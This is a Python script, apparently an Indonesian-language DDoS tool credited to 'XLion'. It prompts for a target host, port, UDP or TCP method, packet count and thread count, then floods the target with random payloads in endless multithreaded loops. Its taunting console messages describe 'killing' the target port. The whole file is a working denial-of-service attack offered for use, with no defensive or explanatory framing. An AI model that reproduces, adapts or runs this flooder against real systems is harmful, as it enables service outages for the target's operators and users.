#!/usr/bin/env python3
#Credit : XLion
#Ganti Credit gw doain cepet tobat lu
import random
import socket
import threading
import socket
import argparse
import sys
from time import time as tt
import os
import re
import urllib.request
import requests

useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1"]

os.system('clear')
print("\033[91m")
print(""" 
┏━┓┏━┳┓
┗┓┗┛┏┫┃
╋┗┓┏┛┃┃╋╋┏┳━━┳━┓
╋┏┛┗┓┃┃╋┏╋┫┏┓┃┏┓┓
┏┛┏┓┗┫┗━┛┃┃┗┛┃┃┃┃
┗━┛┗━┻━━━┻┻━━┻┛┗┛""")
print(""" Methods : UDP,TCP """)
ip = str(input("\033[91mHOST/IP : \033[91m"))
port = int(input("\033[91mPORT : \033[91m"))
choice = str(input("\033[91mMETHOD : \033[91m"))
times = int(input("\033[91mPAKET : \033[91m"))
threads = int(input("\033[91mTHREAD : \033[91m"))

os.system("clear")
def UDP():

	data = random._urandom(1050)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print("\033[91mXN Nih !! aowkwkw %s Membunuh Port %s"%(ip,port))

		except:

			print("Tefar? Aoakwk")



def TCP():

	data = random._urandom(102498)

	i = random.choice(("","",""))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print("\033[91mMenyundut Ip %s Dan Mengantar Paket ke Port %s"%(ip,port))

		except:

			s.close()

			print("Yahaha Paket sampai!!")

for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = UDP)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = TCP)
        th.start()